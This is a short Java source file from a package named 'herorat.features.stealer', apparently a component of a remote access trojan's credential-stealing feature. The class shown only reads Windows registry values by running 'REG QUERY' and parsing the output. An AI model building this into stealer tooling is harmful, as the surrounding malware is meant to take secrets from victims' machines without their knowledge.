package net.herorat.features.stealer;

import java.io.IOException;
import java.io.InputStream;
import java.io.StringWriter;

public class Registry
{
	public static final String readRegistry(String location, String key)
	{
		try 
		{
			ProcessBuilder pb = new ProcessBuilder(new String[]{"REG", "QUERY", location, "/v",  key});
			Process process = pb.start();

			StreamReader reader = new StreamReader(process.getInputStream());
			reader.start();
			process.waitFor();
			reader.join();
			String output = reader.getResult();

			if(!output.contains("\t")) return null;

			String[] parsed = output.split("\t");
			return parsed[parsed.length-1];
		}
		catch (Exception e) {}
		
		return null;
	}

	static class StreamReader extends Thread
	{
		private InputStream is;
		private StringWriter sw = new StringWriter();

		public StreamReader(InputStream is)
		{
			this.is = is;
		}

		public void run()
		{
			try
			{
				int c;
				while ((c = is.read()) != -1) sw.write(c);
			}
			catch (IOException e) {}
		}

		public String getResult()
		{
			return sw.toString();
		}
	}
}